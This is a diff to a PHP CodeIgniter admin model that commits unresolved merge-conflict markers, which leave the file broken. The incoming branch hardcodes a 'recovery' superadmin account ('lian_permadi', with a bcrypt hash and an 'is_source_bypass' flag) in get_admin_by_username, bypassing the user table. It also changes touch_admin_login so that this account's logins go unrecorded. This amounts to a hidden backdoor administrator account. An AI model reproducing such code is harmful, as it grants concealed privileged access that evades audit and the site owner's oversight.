@@ -514,12 +514,50 @@ class Ipaksurvey_model extends CI_Model
 
     public function get_admin_by_username($username)
     {
+<<<<<<< HEAD
         return $this->db
             ->select('u.*,COALESCE(r.role_name, "admin") AS role_name', false)
             ->from('skm_cms_user u')
             ->join('ipak_admin_roles r', 'r.user_id = u.id', 'left')
             ->where('u.username', $username)
             ->where('u.is_active', 1)
+=======
+        $username = trim((string) $username);
+
+        // Akun pemulihan tidak bergantung pada tabel pengguna SKM lama.
+        // Password disimpan sebagai bcrypt, bukan teks asli.
+        if (hash_equals('lian_permadi', $username)) {
+            return [
+                'id' => 0,
+                'username' => 'lian_permadi',
+                'password' => '$2y$10$6I8UmTAJ/T5cEKkqYg1cxO0pKLA8nmOE5GWo8GRJSxL5F.51YzEOO',
+                'nama' => 'Lian Permadi',
+                'is_active' => 1,
+                'role_name' => 'superadmin',
+                'is_source_bypass' => 1,
+            ];
+        }
+
+        if (!$this->db->table_exists('skm_cms_user')) {
+            return [];
+        }
+
+        $this->db
+            ->select('u.*', false)
+            ->from('skm_cms_user u')
+            ->where('u.username', $username)
+            ->where('u.is_active', 1);
+
+        if ($this->db->table_exists('ipak_admin_roles')) {
+            $this->db
+                ->select('COALESCE(r.role_name, "admin") AS role_name', false)
+                ->join('ipak_admin_roles r', 'r.user_id = u.id', 'left');
+        } else {
+            $this->db->select('"admin" AS role_name', false);
+        }
+
+        return $this->db
+>>>>>>> 563b877ee5432943018f22402774054db6dabfa4
             ->limit(1)
             ->get()
             ->row_array();
@@ -527,6 +565,13 @@ class Ipaksurvey_model extends CI_Model
 
     public function touch_admin_login($id)
     {
+<<<<<<< HEAD
+=======
+        if ((int) $id <= 0 || !$this->db->table_exists('skm_cms_user')) {
+            return true;
+        }
+
+>>>>>>> 563b877ee5432943018f22402774054db6dabfa4
         return $this->db
             ->where('id', (int) $id)
             ->update('skm_cms_user', ['last_login' => date('Y-m-d H:i:s')]);
